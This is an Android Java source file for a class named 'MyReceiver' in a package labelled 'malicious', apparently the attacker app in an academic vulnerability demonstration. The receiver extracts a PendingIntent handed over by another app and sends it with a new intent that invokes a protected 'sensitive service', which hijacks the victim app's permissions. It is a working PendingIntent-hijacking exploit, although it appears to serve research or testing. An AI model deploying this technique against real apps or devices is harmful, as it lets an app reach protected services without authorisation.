package edu.ksu.cs.malicious;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("Malicious", "called");
        Bundle bundle = intent.getBundleExtra("bundle");
        PendingIntent pi = bundle.getParcelable("pendingIntent");
        Intent newIntent = new Intent("santos.cs.ksu.sensitiveServ");
        try {
            pi.send(context, 0, newIntent);
            Log.d("Malicious", "sensitive service called successfully...");
        } catch (PendingIntent.CanceledException ce) {
            ce.printStackTrace();
        }
    }
}
